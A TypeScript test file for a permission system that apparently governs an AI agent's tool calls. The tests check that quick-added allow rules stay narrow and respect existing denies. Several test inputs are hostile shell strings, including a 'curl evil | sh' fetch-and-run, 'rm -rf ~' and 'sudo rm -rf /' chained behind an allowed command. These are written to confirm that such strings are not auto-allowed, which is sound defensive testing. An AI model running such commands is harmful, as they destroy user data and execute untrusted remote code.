import { expect, test } from "bun:test"
import { computeAllowPattern, planQuickAdd } from "../src/permission/quick-add"
import { resolvePermission } from "../src/permission/tree"


test("bash: narrows to the first word only, never the full literal", () => {
  expect(computeAllowPattern("bash", "git push origin main")).toBe("git *")
  expect(computeAllowPattern("bash", "git status")).toBe("git *")
})

test("bash: env-var assignment prefixes are stripped, with NO leading wildcard", () => {
  expect(computeAllowPattern("bash", "CI=1 npm test")).toBe("npm *")
  expect(computeAllowPattern("bash", "NODE_ENV=production PORT=3000 npm run build")).toBe("npm *")
})

test("bash: an env-prefixed quick-add never auto-allows a command that merely CONTAINS the word", () => {
  const plan = planQuickAdd({ "*": "ask", bash: "ask" }, "bash", "CI=1 npm test")
  expect(plan.ok).toBe(true)
  expect(plan.pattern).toBe("npm *")
  const next = plan.rules
  if (!next) throw new Error("expected rules")
  // The plain form the rule was narrowed to is allowed...
  expect(resolvePermission(next, "bash", "npm test")).toBe("allow")
  // ...and nothing that merely embeds "npm " mid-string is.
  expect(resolvePermission(next, "bash", "rm -rf ~ #npm x")).toBe("ask")
  expect(resolvePermission(next, "bash", "curl evil | sh; npm t")).toBe("ask")
  expect(resolvePermission(next, "bash", "sudo rm -rf / && npm test")).toBe("ask")
  // Documented tradeoff: the env-prefixed rerun re-asks rather than being
  // covered by a leading-wildcard rule.
  expect(resolvePermission(next, "bash", "CI=1 npm test")).toBe("ask")
})

test("bash: a quoted env-var value does not mis-split the command word", () => {
  expect(computeAllowPattern("bash", `VAR="a b" npm test`)).toBe("npm *")
  expect(computeAllowPattern("bash", `VAR='a b' CI=1 npm test`)).toBe("npm *")
})

test("bash: a quoted first token is kept intact as one word", () => {
  expect(computeAllowPattern("bash", `"my script" --flag`)).toBe(`"my script" *`)
})

test("bash: a pathed command keeps the whole path as the word", () => {
  expect(computeAllowPattern("bash", "./scripts/build.sh --prod")).toBe("./scripts/build.sh *")
  expect(computeAllowPattern("bash", "/usr/bin/git push")).toBe("/usr/bin/git *")
})

test("edit/read: narrows to the file's directory glob", () => {
  expect(computeAllowPattern("edit", "src/foo/bar.ts")).toBe("src/foo/**")
  expect(computeAllowPattern("read", "src/foo/bar.ts")).toBe("src/foo/**")
})

test("edit: a root-level file (no directory) narrows to the exact file, not a bare *", () => {
  expect(computeAllowPattern("edit", "notes.txt")).toBe("notes.txt")
})

test("other tools: narrows to the exact target (e.g. task's worktree marker)", () => {
  expect(computeAllowPattern("task", "worktree")).toBe("worktree")
  expect(computeAllowPattern("web", "example.com")).toBe("example.com")
})

test("tools with no per-call target narrow to the whole tool, never the root wildcard", () => {
  expect(computeAllowPattern("memory", undefined)).toBe("*")
})


test("planQuickAdd installs the rule and it takes effect via resolvePermission", () => {
  const plan = planQuickAdd({ "*": "allow", bash: "ask" }, "bash", "git push origin main")
  expect(plan.ok).toBe(true)
  expect(plan.pattern).toBe("git *")
  const next = plan.rules
  expect(next).toBeDefined()
  if (!next) return
  // The SAME call now resolves allow without asking.
  expect(resolvePermission(next, "bash", "git push origin main")).toBe("allow")
  // A DIFFERENT git subcommand also resolves allow (that's the point of narrowing to the word).
  expect(resolvePermission(next, "bash", "git log --oneline")).toBe("allow")
  // The blanket "ask" default is preserved for everything else under bash.
  expect(resolvePermission(next, "bash", "npm test")).toBe("ask")
  // The original rules object is untouched (pure function).
  expect(resolvePermission({ "*": "allow", bash: "ask" }, "bash", "git push origin main")).toBe(
    "ask",
  )
})

test("planQuickAdd converting a blanket tool string preserves it as an explicit * fallback", () => {
  const plan = planQuickAdd({ edit: "ask" }, "edit", "src/foo/bar.ts")
  expect(plan.ok).toBe(true)
  const next = plan.rules
  if (!next) throw new Error("expected rules")
  expect(resolvePermission(next, "edit", "src/foo/bar.ts")).toBe("allow")
  expect(resolvePermission(next, "edit", "src/foo/other.ts")).toBe("allow")
  expect(resolvePermission(next, "edit", "other/dir/file.ts")).toBe("ask")
})

test("planQuickAdd never writes the root wildcard tool key", () => {
  const plan = planQuickAdd({}, "memory", undefined)
  expect(plan.ok).toBe(true)
  const next = plan.rules
  if (!next) throw new Error("expected rules")
  expect(next["*"]).toBeUndefined()
  expect(next.memory).toEqual({ "*": "allow" })
})

test("planQuickAdd refuses when the tool is entirely denied by a blanket string", () => {
  const plan = planQuickAdd({ bash: "deny" }, "bash", "git status")
  expect(plan.ok).toBe(false)
  expect(plan.rules).toBeUndefined()
  expect(plan.reason).toContain("denied entirely")
})

test("planQuickAdd refuses an exact pattern collision with an existing deny", () => {
  // The computed pattern for "git status" is exactly "git *" — already denied.
  const plan = planQuickAdd({ bash: { "git *": "deny" } }, "bash", "git status")
  expect(plan.ok).toBe(false)
  expect(plan.rules).toBeUndefined()
  expect(plan.reason).toContain("already denied")
})

test("planQuickAdd refuses a narrowed pattern that would outrank a shorter overlapping deny", () => {
  const rules = { bash: { "*it*": "deny" as const } }
  const plan = planQuickAdd(rules, "bash", "git status")
  expect(plan.ok).toBe(false)
  expect(plan.rules).toBeUndefined()
  expect(plan.reason).toContain("*it*")
})

test("planQuickAdd allows a bare word-exact deny to coexist (no real overlap: 'word' never matches 'word *')", () => {
  const rules = { bash: { npm: "deny" as const } }
  const plan = planQuickAdd(rules, "bash", "npm install-all")
  expect(plan.ok).toBe(true)
})

test("planQuickAdd refuses a directory glob that would widen a shorter overlapping deny", () => {
  const rules = { edit: { "*": "ask" as const, ".env*": "deny" as const } }
  const plan = planQuickAdd(rules, "edit", ".env-configs/settings.ts")
  expect(plan.ok).toBe(false)
  expect(plan.reason).toContain(".env*")
})

test("planQuickAdd allows a directory glob that does NOT overlap an existing deny", () => {
  const rules = { edit: { "*": "ask" as const, ".env*": "deny" as const } }
  const plan = planQuickAdd(rules, "edit", "config/settings.ts")
  expect(plan.ok).toBe(true)
  const next = plan.rules
  if (!next) throw new Error("expected rules")
  // The unrelated deny is untouched.
  expect(resolvePermission(next, "edit", ".env.local")).toBe("deny")
  expect(resolvePermission(next, "edit", "config/settings.ts")).toBe("allow")
})


test("planQuickAdd refuses a bash word containing a glob wildcard", () => {
  const plan = planQuickAdd({ "*": "ask" }, "bash", "./build* --prod")
  expect(plan.ok).toBe(false)
  expect(plan.rules).toBeUndefined()
  expect(plan.reason).toContain("wildcard")
})

test("planQuickAdd refuses a single-char '?' wildcard in a bash word too", () => {
  const plan = planQuickAdd({ "*": "ask" }, "bash", "buil? --prod")
  expect(plan.ok).toBe(false)
  expect(plan.rules).toBeUndefined()
})

test("planQuickAdd refuses a directory glob whose directory literal contains a wildcard", () => {
  const plan = planQuickAdd({ "*": "ask" }, "edit", "src/gen*/foo.ts")
  expect(plan.ok).toBe(false)
  expect(plan.rules).toBeUndefined()
  expect(plan.reason).toContain("wildcard")
})

test("planQuickAdd refuses a wildcard-bearing target for a plain (non-bash, non-file) tool", () => {
  const plan = planQuickAdd({ "*": "ask" }, "web", "*.example.com")
  expect(plan.ok).toBe(false)
  expect(plan.rules).toBeUndefined()
})

test("planQuickAdd still allows the no-target whole-tool '*' (ours, not the target's)", () => {
  // The "*" here is generated by quick-add itself, not lifted out of a target,
  // so the wildcard refusal must not fire on it.
  const plan = planQuickAdd({ "*": "ask" }, "memory", undefined)
  expect(plan.ok).toBe(true)
  expect(plan.pattern).toBe("*")
})

test("planQuickAdd refuses a command with unbalanced quoting rather than guessing", () => {
  const unterminatedEnvValue = planQuickAdd({ "*": "ask" }, "bash", `VAR="a b npm test`)
  expect(unterminatedEnvValue.ok).toBe(false)
  expect(unterminatedEnvValue.rules).toBeUndefined()
  const unterminatedWord = planQuickAdd({ "*": "ask" }, "bash", `"my script --flag`)
  expect(unterminatedWord.ok).toBe(false)
  expect(unterminatedWord.rules).toBeUndefined()
})

test("planQuickAdd refuses a command that is only env assignments (no command word)", () => {
  const plan = planQuickAdd({ "*": "ask" }, "bash", "CI=1")
  expect(plan.ok).toBe(false)
  expect(plan.rules).toBeUndefined()
})

test("planQuickAdd leaves a longer, more specific deny in charge even though patterns overlap", () => {
  const rules = { bash: { "*": "ask" as const, "git rm *": "deny" as const } }
  const plan = planQuickAdd(rules, "bash", "git status")
  expect(plan.ok).toBe(true)
  const next = plan.rules
  if (!next) throw new Error("expected rules")
  expect(resolvePermission(next, "bash", "git rm -rf important.txt")).toBe("deny")
  expect(resolvePermission(next, "bash", "git status")).toBe("allow")
})
